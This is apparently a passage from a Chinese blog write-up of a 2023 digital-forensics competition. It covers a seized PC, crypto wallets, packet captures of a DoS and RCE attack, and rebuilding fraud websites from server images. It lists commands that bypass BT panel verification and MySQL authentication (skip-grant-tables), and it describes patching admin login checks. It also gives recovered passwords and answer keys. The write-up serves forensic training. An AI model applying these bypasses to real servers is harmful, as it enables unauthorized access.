<h2 id="2-涉案计算机最后一次正常关机时间-。（标准格式：2023-1-11-11-11-11）"><a href="#2-涉案计算机最后一次正常关机时间-。（标准格式：2023-1-11-11-11-11）" class="headerlink" title="2.涉案计算机最后一次正常关机时间_。（标准格式：2023-1-11.11:11:11）"></a>2.涉案计算机最后一次正常关机时间<strong><em>_</em></strong>。（标准格式：2023-1-11.11:11:11）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-233944720.png" class="">  
<p>2023-09-16 18:20:34</p>
<h2 id="3-分析涉案计算机，在2022年11月4日此电脑共开机时长为-。（标准格式：1小时1分1秒）"><a href="#3-分析涉案计算机，在2022年11月4日此电脑共开机时长为-。（标准格式：1小时1分1秒）" class="headerlink" title="3.分析涉案计算机，在2022年11月4日此电脑共开机时长为_。（标准格式：1小时1分1秒）"></a>3.分析涉案计算机，在2022年11月4日此电脑共开机时长为<strong><em>_</em></strong>。（标准格式：1小时1分1秒）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-3.png" class="" title="alt text">
<p>把这几个加起来，不要忘记夹0-9.42的</p>
<h2 id="4-对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是-否）"><a href="#4-对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是-否）" class="headerlink" title="4.对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是/否）"></a>4.对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是/否）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-5-4.png" class="" title="alt text">
<h2 id="5-检材硬盘中有一个加密分区，给出其中“我的秘密-jpg”文档的解密内容。（标准格式：Longxin0924）"><a href="#5-检材硬盘中有一个加密分区，给出其中“我的秘密-jpg”文档的解密内容。（标准格式：Longxin0924）" class="headerlink" title="5.检材硬盘中有一个加密分区，给出其中“我的秘密.jpg”文档的解密内容。（标准格式：Longxin0924）"></a>5.检材硬盘中有一个加密分区，给出其中“我的秘密.jpg”文档的解密内容。（标准格式：Longxin0924）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-5-2.png" class="" title="alt text">
<p>在分析里可以找到密钥解密后可以看到我的密码<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-5-1.png" class="" title="alt text"><br>base64编码<br>Mimi1234</p>
<h2 id="6-接上题，请问该嫌疑人10月份工资是-元。（标准格式：123）"><a href="#6-接上题，请问该嫌疑人10月份工资是-元。（标准格式：123）" class="headerlink" title="6.接上题，请问该嫌疑人10月份工资是_元。（标准格式：123）"></a>6.接上题，请问该嫌疑人10月份工资是<strong><em>_</em></strong>元。（标准格式：123）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-6.png" class="" title="alt text">
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-6-2.png" class="" title="alt text">
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-234437692.png" class="">  
<p>我们能在微信传输文件找到应该工资条但是那不是真的，真的在加密分区的回收站里</p>
<h2 id="7-对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是-。（标准格式：Longxin0924）"><a href="#7-对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是-。（标准格式：Longxin0924）" class="headerlink" title="7.对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是__。（标准格式：Longxin0924）"></a>7.对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是<strong>__</strong>。（标准格式：Longxin0924）</h2><p>在浏览器中保存的密码中可以看到其密码为LongXin@2023<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-7.png" class="" title="alt text"></p>
<h2 id="8-结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D-X-X-1-txt）"><a href="#8-结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D-X-X-1-txt）" class="headerlink" title="8.结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D:\X\X\1.txt）"></a>8.结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D:\X\X\1.txt）</h2><p>这里开启火眼的耗时任务中的文本索引。<br>搜索114092可以找到如下文件<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241029-000205267.png" class=""><br>这样就可以得到这个海报了<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241029-000405411.png" class=""><br>C:\Program Files (x86)\Tencent\WeChat\2.png<br>把两个文件拖到010可以发现2.png有隐写<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241029-001022579.png" class=""><br>隐写内容就是银行卡号</p>
<h2 id="9-请找出嫌疑人的2022年收入共-。（标准格式：123）"><a href="#9-请找出嫌疑人的2022年收入共-。（标准格式：123）" class="headerlink" title="9.请找出嫌疑人的2022年收入共_。（标准格式：123）"></a>9.请找出嫌疑人的2022年收入共<strong><em>_</em></strong>。（标准格式：123）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-235731876.png" class="">  
<p>我们打开仿真可以找到容器和挂载容器的工具。<br>直接使用2.png当密钥可以成功挂载<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241029-001329622.png" class=""><br>但是直接挂载是无法看到被删的文件的索引需要使用R-studio挂载</p>
<h2 id="10-分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）"><a href="#10-分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）" class="headerlink" title="10.分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）"></a>10.分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）</h2><p>6523365008214741321</p>
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/4.jpg" class="" title="alt text">
<p>搜索海报</p>
<h1 id="虚拟币分析"><a href="#虚拟币分析" class="headerlink" title="虚拟币分析"></a>虚拟币分析</h1><h2 id="1-分析涉案计算机，正确填写中转地址当前的代币种类-。（标准格式：BNB）"><a href="#1-分析涉案计算机，正确填写中转地址当前的代币种类-。（标准格式：BNB）" class="headerlink" title="1.分析涉案计算机，正确填写中转地址当前的代币种类__。（标准格式：BNB）"></a>1.分析涉案计算机，正确填写中转地址当前的代币种类<strong>__</strong>。（标准格式：BNB）</h2><p>前面容器得到了应该容器，这个容器内有个夜神模拟器的npbk文件<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241029-083510819.png" class="">  </p>
<h2 id="2-分析涉案计算机，正确填写中转地址当前的代币余额数量-。（标准格式：1-23）"><a href="#2-分析涉案计算机，正确填写中转地址当前的代币余额数量-。（标准格式：1-23）" class="headerlink" title="2.分析涉案计算机，正确填写中转地址当前的代币余额数量_。（标准格式：1.23）"></a>2.分析涉案计算机，正确填写中转地址当前的代币余额数量<strong><em>_</em></strong>。（标准格式：1.23）</h2><h2 id="3-根据中转地址转账记录找出买币方地址。买币方地址：-（标准格式：0x123ABC"><a href="#3-根据中转地址转账记录找出买币方地址。买币方地址：-（标准格式：0x123ABC" class="headerlink" title="3.根据中转地址转账记录找出买币方地址。买币方地址：_（标准格式：0x123ABC)"></a>3.根据中转地址转账记录找出买币方地址。买币方地址：<strong>_</strong>（标准格式：0x123ABC)</h2><h2 id="4-根据中转地址转账记录统计买方地址转账金额。转账金额：-ETH-（标准格式-12-3）"><a href="#4-根据中转地址转账记录统计买方地址转账金额。转账金额：-ETH-（标准格式-12-3）" class="headerlink" title="4.根据中转地址转账记录统计买方地址转账金额。转账金额：__ ETH.（标准格式:12.3）"></a>4.根据中转地址转账记录统计买方地址转账金额。转账金额：<em>__</em> ETH.（标准格式:12.3）</h2><h2 id="5-在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（-）"><a href="#5-在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（-）" class="headerlink" title="5.在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（ ）"></a>5.在创建钱包时，应用APP都会建议我们进行助记词备份，方便以后忘记密码后找回钱包，在办案过程中时常会拿到犯罪嫌疑人备份的助记词的情况。请从以下三组助记词中判断出格式正确的一组（ ）</h2><p> raw sausage art hub inspire dizzy funny exile local middle shed primary<br> raw sausage art hub inspire dizzy funny middle shed primary<br> raw sausage art funny exile local middle shed primary<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-211629047.png" class=""><br>选A</p>
<h2 id="6-假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken-APP恢复嫌疑人钱包，并选出正确钱包地址（-）"><a href="#6-假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken-APP恢复嫌疑人钱包，并选出正确钱包地址（-）" class="headerlink" title="6.假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken APP恢复嫌疑人钱包，并选出正确钱包地址（ ）"></a>6.假设上题中正确的助记词为通过侦察找到的嫌疑人钱包助记词备份（已知地址属于以太坊链），请在模拟器中通过imToken APP恢复嫌疑人钱包，并选出正确钱包地址（ ）</h2><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><h2 id="1-分析“数据包1-cap”，请问客户端为什么访问不了服务器。（-）"><a href="#1-分析“数据包1-cap”，请问客户端为什么访问不了服务器。（-）" class="headerlink" title="1.分析“数据包1.cap”，请问客户端为什么访问不了服务器。（ ）"></a>1.分析“数据包1.cap”，请问客户端为什么访问不了服务器。（ ）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-221648941.png" class="">  
<p>通过分析tcp会话可以发现10.5.0.19对116.211.168.203进行了大量的tcp连接，且时间极短，且只有这个ip有这种行为判断其为DOS攻击(单机子)。DDOS(多对一)<br>选B</p>
<h2 id="2-分析“数据包1-cap”，出问题的服务器IP地址是-。（格式：127-0-0-1）"><a href="#2-分析“数据包1-cap”，出问题的服务器IP地址是-。（格式：127-0-0-1）" class="headerlink" title="2.分析“数据包1.cap”，出问题的服务器IP地址是_。（格式：127.0.0.1）"></a>2.分析“数据包1.cap”，出问题的服务器IP地址是<strong><em>_</em></strong>。（格式：127.0.0.1）</h2><p>出问题的ip就是杯dos的ip即116.211.168.203<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-213859429.png" class="">  </p>
<p>116.211.168.203</p>
<h2 id="3-分析“数据包1-cap”，文件下发服务器的IP地址是-。（标准格式：127-0-0-1）"><a href="#3-分析“数据包1-cap”，文件下发服务器的IP地址是-。（标准格式：127-0-0-1）" class="headerlink" title="3.分析“数据包1.cap”，文件下发服务器的IP地址是_。（标准格式：127.0.0.1）"></a>3.分析“数据包1.cap”，文件下发服务器的IP地址是<strong><em>_</em></strong>。（标准格式：127.0.0.1）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-215325471.png" class="">  
<p>120.210.129.29返回了java.log文件<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-215615284.png" class=""><br>且该文件是ELF开头的可执行文件</p>
<h2 id="4-分析“数据包1-cap”，攻击者利用-漏洞进行远程代码执行。（标准格式：小写，无中文）"><a href="#4-分析“数据包1-cap”，攻击者利用-漏洞进行远程代码执行。（标准格式：小写，无中文）" class="headerlink" title="4.分析“数据包1.cap”，攻击者利用_漏洞进行远程代码执行。（标准格式：小写，无中文）"></a>4.分析“数据包1.cap”，攻击者利用<strong><em>_</em></strong>漏洞进行远程代码执行。（标准格式：小写，无中文）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-222257051.png" class="">  
<p>我们可以看到其向222.186.21.154发送了请求如下<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-222420849.png" class=""><br>其进行了攻击行为<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-220004898.png" class="">  </p>
<h2 id="5-分析“数据包1-cap”，请提取恶意文件，并校验该文件的MD5值为-。-标准格式-abcd"><a href="#5-分析“数据包1-cap”，请提取恶意文件，并校验该文件的MD5值为-。-标准格式-abcd" class="headerlink" title="5.分析“数据包1.cap”，请提取恶意文件，并校验该文件的MD5值为_。(标准格式:abcd)"></a>5.分析“数据包1.cap”，请提取恶意文件，并校验该文件的MD5值为<strong><em>_</em></strong>。(标准格式:abcd)</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-224218051.png" class="">  
<p>提取出之前的java.log文件<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-224317212.png" class="">  </p>
<h2 id="6-分析“数据包2-cap”，其获取文件的路径是-。（标准格式：D-X-X-1-txt）"><a href="#6-分析“数据包2-cap”，其获取文件的路径是-。（标准格式：D-X-X-1-txt）" class="headerlink" title="6.分析“数据包2.cap”，其获取文件的路径是__。（标准格式：D:/X/X/1.txt）"></a>6.分析“数据包2.cap”，其获取文件的路径是<strong><em>__</em></strong>。（标准格式：D:/X/X/1.txt）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-224530253.png" class="">  
<p>C:/Users/Administrator/Downloads/新建文件夹/新建文件夹/mail.png</p>
<h2 id="7-分析“数据包2-cap”，文件下载服务器的认证账号密码是-。（标准格式：123）"><a href="#7-分析“数据包2-cap”，文件下载服务器的认证账号密码是-。（标准格式：123）" class="headerlink" title="7.分析“数据包2.cap”，文件下载服务器的认证账号密码是_。（标准格式：123）"></a>7.分析“数据包2.cap”，文件下载服务器的认证账号密码是<strong><em>_</em></strong>。（标准格式：123）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-225210947.png" class="">  
<p>admin:passwd</p>
<h2 id="8-分析“数据包2-cap”，其下载的文件大小有-字节。（标准格式"><a href="#8-分析“数据包2-cap”，其下载的文件大小有-字节。（标准格式" class="headerlink" title="8.分析“数据包2.cap”，其下载的文件大小有__字节。（标准格式"></a>8.分析“数据包2.cap”，其下载的文件大小有<strong><em>__</em></strong>字节。（标准格式</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-224850505.png" class="">  
<p>导出直接看就可以了</p>
<h1 id="服务器取证"><a href="#服务器取证" class="headerlink" title="服务器取证"></a>服务器取证</h1><h2 id="1-服务器系统的版本号是-。（格式：1-1-1111）"><a href="#1-服务器系统的版本号是-。（格式：1-1-1111）" class="headerlink" title="1.服务器系统的版本号是_。（格式：1.1.1111）"></a>1.服务器系统的版本号是<strong><em>_</em></strong>。（格式：1.1.1111）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-092701110.png" class="">  
<h2 id="2-网站数据库的版本号是-。（格式：1-1-1111）"><a href="#2-网站数据库的版本号是-。（格式：1-1-1111）" class="headerlink" title="2.网站数据库的版本号是_。（格式：1.1.1111）"></a>2.网站数据库的版本号是<strong><em>_</em></strong>。（格式：1.1.1111）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-092754403.png" class="">  
<h2 id="3-宝塔面板的“超时”时间是-分钟。（格式：50）"><a href="#3-宝塔面板的“超时”时间是-分钟。（格式：50）" class="headerlink" title="3.宝塔面板的“超时”时间是_分钟。（格式：50）"></a>3.宝塔面板的“超时”时间是<strong><em>_</em></strong>分钟。（格式：50）</h2><p>仿真后通过ssh连接。打开宝塔面板登陆后会发现其需要进行验证我们可以通过如下命令来关闭验证<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bt default &amp;&amp; bt 23 &amp;&amp; bt 11 &amp;&amp; bt 12 &amp;&amp; bt 13 &amp;&amp; bt 24 &amp;&amp; bt 5 &amp;&amp; bt default</span><br></pre></td></tr></table></figure><br>而后会发现其需要手机验证，这时后我们可以选择降版本到7.7，然后删除<br><code>rm -f /www/server/panel/data/bind.pl</code>即可绕过<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-093215907.png" class="">  </p>
<h2 id="4-网站源码备份压缩文件SHA256值是-。（格式：64位小写）"><a href="#4-网站源码备份压缩文件SHA256值是-。（格式：64位小写）" class="headerlink" title="4.网站源码备份压缩文件SHA256值是_。（格式：64位小写）"></a>4.网站源码备份压缩文件SHA256值是<strong><em>_</em></strong>。（格式：64位小写）</h2><p>我们在/www/backup/site可以找到备份文件。可以直接在仿真下进行导出，也可以用火眼，但是我用火眼导出的好像有点小问题<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-093647658.png" class=""><br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-100114765.png" class="">  </p>
<h2 id="5-分发网站sb-wiiudot-cn管理员密码默认MD5加密盐值是-。（格式：abcd）"><a href="#5-分发网站sb-wiiudot-cn管理员密码默认MD5加密盐值是-。（格式：abcd）" class="headerlink" title="5.分发网站sb.wiiudot.cn管理员密码默认MD5加密盐值是_。（格式：abcd）"></a>5.分发网站sb.wiiudot.cn管理员密码默认MD5加密盐值是<strong><em>_</em></strong>。（格式：abcd）</h2><p>在源码里搜password，可以找到登陆的加密逻辑<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-100504045.png" class=""><br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-100518492.png" class="">  </p>
<h2 id="6-分发网站sb-wiiudot-cn一共存放了-条通讯录数据。（标准格式：1234）"><a href="#6-分发网站sb-wiiudot-cn一共存放了-条通讯录数据。（标准格式：1234）" class="headerlink" title="6. 分发网站sb.wiiudot.cn一共存放了_条通讯录数据。（标准格式：1234）"></a>6. 分发网站sb.wiiudot.cn一共存放了<strong><em>_</em></strong>条通讯录数据。（标准格式：1234）</h2><p>这个题我们需要重构宝塔服务器，</p>
<h3 id="重构数据库"><a href="#重构数据库" class="headerlink" title="重构数据库"></a>重构数据库</h3><p>我们先登陆一下mysql<br>我们可以通过修改/etc/my.cnf来进行绕过登陆<br>使用systemctl stop mysqld关闭mysql，<br>在/etc/my.cnf的<code>[mysqlid]</code>skip-grant-tables<br>然后systemctl start mysqld打开mysql就能无密码登陆<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-111503613.png" class="">  </p>
<p>然后使用Navicat打开</p>
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-111639811.png" class="" title="image.png1">  
<p>当然以为没有外连所以我们还有打开ssh隧道<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-111809221.png" class=""><br>我们可以直接在数据库里查看到通信录数据<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-114411864.png" class=""><br>查询app_mobile的所有列即可<br>但这并不一定是真实的数据。我们还需要打开网站来查看</p>
<h3 id="重构网站"><a href="#重构网站" class="headerlink" title="重构网站"></a>重构网站</h3><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-112236614.png" class="">  
<p>先将数据库修改为localhost</p>
<p>然后我们将解析的域名解析修改<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-112407597.png" class=""><br>我看网上都是修改host解析地址，但是我懒，所以我们就直接在宝塔里加了一个新的地址</p>
<p>这样网站就可以正常访问了<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-112707706.png" class="">  </p>
<p>我们在admin路径来进行登陆<br>![<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-112821753.png" class=""><br>我们通过回显的信息可以定位到登陆的源码</p>
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-113939979.png" class="">  
<p>我们直接改鉴权<br>然后就可以随便登陆后台了<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-114112793.png" class="">  </p>
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-114747684.png" class="">  
<p>我去实际上竟然是67096</p>
<h2 id="7-全部网站一共有-名受害人。（格式：xxx。不去重-不进行数据恢复）"><a href="#7-全部网站一共有-名受害人。（格式：xxx。不去重-不进行数据恢复）" class="headerlink" title="7.全部网站一共有_名受害人。（格式：xxx。不去重,不进行数据恢复）"></a>7.全部网站一共有<strong><em>_</em></strong>名受害人。（格式：xxx。不去重,不进行数据恢复）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-115939869.png" class="">  
<p>我们可以看到器userid应该就代表着受害者。那么我们只有查所有网站数据库不同的userid即可<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-115510066.png" class=""><br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-122550533.png" class="">  </p>
<p>其他网站的数据库名称可以通过源码来看<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-122901833.png" class="">  </p>
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-123005785.png" class="">  
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-122943293.png" class="">  
<p>加起来就是506</p>
<h2 id="8-分发网站tf-chongwuxiaoyouxi-com里面一共有-位“组员级别”的管理员。（格式：数字）"><a href="#8-分发网站tf-chongwuxiaoyouxi-com里面一共有-位“组员级别”的管理员。（格式：数字）" class="headerlink" title="8.分发网站tf.chongwuxiaoyouxi.com里面一共有_位“组员级别”的管理员。（格式：数字）"></a>8.分发网站tf.chongwuxiaoyouxi.com里面一共有<strong><em>_</em></strong>位“组员级别”的管理员。（格式：数字）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-123556997.png" class="">  
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-123455249.png" class="">  
<p>查看app_admin_cate可以知道当cate_id为22时为普通成员</p>
<p>当然可以通过登陆网站来进行。和前面的一样，只是我们还需要改一下器伪静态规则，直接将之前网站的伪静态规则复制过来就行了<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-125031469.png" class=""><br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-125044234.png" class="">  </p>
<h2 id="9-分发网站sb-wiiudot-cn管理员名为“0820”的邀请码是-。（格式：xxx）"><a href="#9-分发网站sb-wiiudot-cn管理员名为“0820”的邀请码是-。（格式：xxx）" class="headerlink" title="9.分发网站sb.wiiudot.cn管理员名为“0820”的邀请码是_。（格式：xxx）"></a>9.分发网站sb.wiiudot.cn管理员名为“0820”的邀请码是<strong><em>_</em></strong>。（格式：xxx）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-125420925.png" class="">  
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-125504701.png" class="">  
<p><img src="%E9%99%87%E4%BF%A12023/IMG_20241028-125650246.png" alt="<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-125504701.png" class="">  
 1">  </p>
<h2 id="10-分发网站sb-wiiudot-cn本地数据库用户sbwiiudotcn的密码是-。（格式：xxx）"><a href="#10-分发网站sb-wiiudot-cn本地数据库用户sbwiiudotcn的密码是-。（格式：xxx）" class="headerlink" title="10.分发网站sb.wiiudot.cn本地数据库用户sbwiiudotcn的密码是_。（格式：xxx）"></a>10.分发网站sb.wiiudot.cn本地数据库用户sb<em>wiiudot<em>cn的密码是<strong>_</strong></em></em>。（格式：xxx）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-130102289.png" class="">  
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-130122116.png" class="">  
<p>我们能找到两个密码在宝塔中的是lSfXN770ZPjte9m在备份文件中的是KE5f3xnFHYAnG5Dt，而题目问的是本地的数据库密码，而宝塔中的密码是远端服务器的mysql密码所以这个题的答案应该是KE5f3xnFHYAnG5Dt</p>
<h1 id="服务器取证2"><a href="#服务器取证2" class="headerlink" title="服务器取证2"></a>服务器取证2</h1><h2 id="1-请分析宝塔面板中默认建站目录是-。（标准格式：-etc-www）"><a href="#1-请分析宝塔面板中默认建站目录是-。（标准格式：-etc-www）" class="headerlink" title="1.请分析宝塔面板中默认建站目录是_。（标准格式：/etc/www）"></a>1.请分析宝塔面板中默认建站目录是<strong><em>_</em></strong>。（标准格式：/etc/www）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-175005246.png" class="">  
<h2 id="2-在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是-。（标准格式：int-11-）"><a href="#2-在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是-。（标准格式：int-11-）" class="headerlink" title="2.在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是_。（标准格式：int(11)）"></a>2.在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是<strong><em>_</em></strong>。（标准格式：int(11)）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-175850483.png" class="">  
<p>和前面的一样，我们直接通过修改配置来登陆mysql，然后通过Navicat来查看<br>但是我不知道为什么不能通过Navicat来看这个数据库，好怪，但是我们可以通过火眼来看<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-180538550.png" class=""><br>Char(128)</p>
<h2 id="3-请分析“乐享金融”网站绑定的域名是-。（标准格式：www-baidu-com）"><a href="#3-请分析“乐享金融”网站绑定的域名是-。（标准格式：www-baidu-com）" class="headerlink" title="3.请分析“乐享金融”网站绑定的域名是_。（标准格式：www.baidu.com）"></a>3.请分析“乐享金融”网站绑定的域名是<strong><em>_</em></strong>。（标准格式：www.baidu.com）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-175256810.png" class="">  
<p>我们打开会看不到网站栏，我们可以点卡菜单来开启显示<br>我们可以发现只有一个网站那这个就应该是绑定的域名了<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-180717296.png" class="">  </p>
<h2 id="4-请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是-。（标准格式：abcdefghijklmnopqrstuvwsyz）"><a href="#4-请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是-。（标准格式：abcdefghijklmnopqrstuvwsyz）" class="headerlink" title="4.请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是_。（标准格式：abcdefghijklmnopqrstuvwsyz）"></a>4.请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是<strong><em>_</em></strong>。（标准格式：abcdefghijklmnopqrstuvwsyz）</h2><p>因为我们后面的题目都要看源码和修复网站，所以我们把宝塔的源码压缩后下载下来，看到会更清楚一点<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-181526103.png" class=""><br>题目问我们加密结果,其实就是考加密逻辑<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-182919388.png" class=""><br>我们找一下数据库的utime<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-182558802.png" class=""></p>
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-182831989.png" class="">  
<p>得到结果</p>
<h2 id="5-请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是-。（标准格式：爱金融）"><a href="#5-请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是-。（标准格式：爱金融）" class="headerlink" title="5.请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是_。（标准格式：爱金融）"></a>5.请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是<strong><em>_</em></strong>。（标准格式：爱金融）</h2><h3 id="网站重构方法"><a href="#网站重构方法" class="headerlink" title="网站重构方法"></a>网站重构方法</h3><p>我们可以看其mysql地址是127.0.0.1即不用修改,而其网站运行方式竟然是静态的,所以我们将其改为php,且php版本要稍微高点,因为低版本并不适配<code>__DIR__</code>会倒置报错<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-184043079.png" class=""> </p>
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-184225011.png" class="">  
<p>然后是修改器运行目录,我们可以发现其运行目录是public应该为网站根目录才对</p>
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-184157299.png" class="">  
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-184438558.png" class="">  
<p>其叫睿文化,真难看阿</p>
<h2 id="6-分发网站sb-wiiudot-cn一共存放了-条通讯录数据。（标准格式：1234）-1"><a href="#6-分发网站sb-wiiudot-cn一共存放了-条通讯录数据。（标准格式：1234）-1" class="headerlink" title="6.分发网站sb.wiiudot.cn一共存放了_条通讯录数据。（标准格式：1234）"></a>6.分发网站sb.wiiudot.cn一共存放了<strong><em>_</em></strong>条通讯录数据。（标准格式：1234）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-190217142.png" class="">  
